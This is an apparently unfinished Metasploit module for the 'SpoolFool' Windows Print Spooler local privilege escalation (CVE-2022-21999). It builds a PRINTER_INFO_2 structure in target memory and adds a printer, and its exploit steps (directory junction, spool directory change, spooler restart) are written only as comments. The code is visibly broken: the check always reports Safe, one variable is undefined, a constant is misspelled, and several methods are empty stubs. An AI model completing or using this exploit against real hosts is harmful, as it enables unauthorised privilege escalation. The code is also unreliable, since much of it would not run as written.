##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SpoolFool Privesc',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Oliver Lyak', # Vuln discovery and PoC
          'Shelby Pace' # metasploit module
        ],
        'Platform' => [ 'win' ],
        'Arch' => ARCH_X64,
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81'],
          [ 'CVE', '2022-21999']
        ],
        'DisclosureDate' => '2022-02-08',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_RESTARTS ],
          'Reliability' => [],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
            ]
          }
        }
      )
    )
  end

  def check
    unless sysinfo['OS'] =~ /windows/i
      return CheckCode::Safe('This module only supports Windows targets.')
    end

    CheckCode::Safe
  end

  def winspool
    session.railgun.winspool
  end

  def spoolss
    session.railgun.spoolss
  end

  def kernel32
    session.railgun.kernel32
  end

  def convert_struct(struct_data = {})
    data = ''
    values = struct_data.values

    values.each do |val|
      case val[:type]
      when :POINTER
        data << (val[:value].to_s.empty? ? [ 0 ].pack('Q') : [ val[:value] ].pack('Q'))
      when :DWORD
        data << (val[:value].nil? ? [ 0 ].pack('L') : [ val[:value] ].pack('L'))
      end
    end

    data
  end

  def alloc_printer_info_struct
    server_name = "#{Rex::Text.rand_text_alpha(5..12)}\x00"
    printer_name = "#{Rex::Text.rand_text_alpha(5..12)}\x00"
    port_name = "LPT1\x00"
    driver_name = "Microsoft Print To PDF\x00"
    print_proc_name = "winprint\x00"
    p_datatype = "RAW\x00"

    print_strs = "#{server_name}#{printer_name}#{port_name}#{driver_name}#{print_proc_name}#{p_datatype}"
    base = session.railgun.util.alloc_and_write_string(print_strs)

    fail_with(Failure::UnexpectedReply, 'Failed to allocate strings for PRINTER_INFO_2 structure') unless base

    print_info_struct = {
      pServerName: { type: :POINTER, value: base + print_strs.index(server_name) },
      pPrinterName: { type: :POINTER, value: base + print_strs.index(printer_name) },
      pShareName: { type: :POINTER, value: '' },
      pPortName: { type: :POINTER, value: base + print_strs.index(port_name) },
      pDriverName: { type: :POINTER, value: base + print_strs.index(driver_name) },
      pComment: { type: :POINTER, value: '' },
      pLocation: { type: :POINTER, value: '' },
      pDevMode: { type: :POINTER, value: '' },
      pSepFile: { type: :POINTER, value: '' },
      pPrintProcessor: { type: :POINTER, value: base + print_strs.index(print_proc_name) },
      pDatatype: { type: :POINTER, value: base + print_strs.index(p_datatype) },
      pParameters: { type: :POINTER, value: '' },
      pSecurityDescriptor: { type: :POINTER, value: '' },
      Attributes: { type: :DWORD, value: client.railgun.const('PRINTER_ATTRIBUTE_LOCAL') },
      Priority: { type: :DWORD, value: nil },
      DefaultPriority: { type: :DWORD, value: nil },
      StartTime: { type: :DWORD, value: nil },
      UntilTime: { type: :DWORD, value: nil },
      Status: { type: :DWORD, value: nil },
      cJobs: { type: :DWORD, value: nil },
      AveragePPM: { type: :DWORD, value: nil }
    }

    struct = convert_struct(print_info_struct)
    poi = kernel32.VirtualAlloc(nil, struct.length, MEM_COMMIT | MEM_RESERV, PAGE_READWRITE)
    fail_with(Failure::UnexpectedReply, 'Failed to allocate memory for struct') if poi['return'].nil?

    addr = poi['return']
    unless railgun.memwrite(addr, struct, struct.length)
      fail_with(Failure::UnexpectedReply, 'Failed to write PRINTER_INFO_2 struct to memory')
    end

    addr
  end

  def add_printer
    pointer = alloc_printer_info_struct
    ret = winspool.AddPrinterA(nil, 2, [ addr ].pack('Q'))
  end

  def restart_spooler; end

  def exploit
    handle = add_printer
    # add printer
    # create junction
    # set spooldirectory
    # restart spooler by loading C:\Windows\System32\AppVTerminator.dll
  end
end
